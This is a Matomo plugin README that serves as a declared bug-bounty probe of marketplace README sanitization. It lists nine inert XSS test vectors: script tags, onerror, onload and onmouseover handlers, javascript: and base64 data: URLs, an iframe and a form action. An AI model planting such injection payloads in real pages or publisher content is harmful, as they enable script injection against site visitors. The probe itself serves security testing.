# ReadmeRenderProbe

Marketplace README-rendering security probe. Authorized security research for the
Matomo HackerOne bounty program (researcher: @RootAccessX, 2026-09). This plugin has
no functionality; it exists solely to test how plugins.matomo.org renders
publisher-supplied README HTML. All markers below are INERT (console string
assignments, no alerts, no external calls except one example.invalid iframe).

## Description

Each line below tests a different rendering sink. If any marker executes or renders
as live markup (rather than escaped text), publisher READMEs are unsanitized on the
marketplace:

- probe1 raw script tag: <script>window.__mpProbe1='raw-script-tag'</script>
- probe2 img onerror attribute: <img src=x onerror="window.__mpProbe2='img-onerror-attr'">
- probe3 svg onload: <svg onload="window.__mpProbe3='svg-onload'"></svg>
- probe4 iframe: <iframe src="https://example.invalid/mp-probe4"></iframe>
- probe5 javascript: href: <a href="javascript:window.__mpProbe5='js-url-href'">probe5 link</a>
- probe6 markdown-generated javascript: link: [probe6 markdown js link](javascript:window.__mpProbe6='md-js-link')
- probe7 data: URL href: <a href="data:text/html;base64,PHNjcmlwdD53aW5kb3cuX19tcFByb2JlNz0nZGF0YS11cmwnPC9zY3JpcHQ+">probe7 link</a>
- probe8 onmouseover div: <div onmouseover="window.__mpProbe8='div-onmouseover'">probe8 hover div</div>
- probe9 form action: <form action="javascript:void(0)"><input type="submit" value="probe9 form"></form>

## FAQ

### Why does this plugin exist?

To test marketplace README rendering for the Matomo HackerOne program. It will be
removed after the test concludes. It tracks nothing, collects nothing, and performs
no network requests.

### Is it safe to install?

Yes - it contains a single empty plugin class and no event handlers.
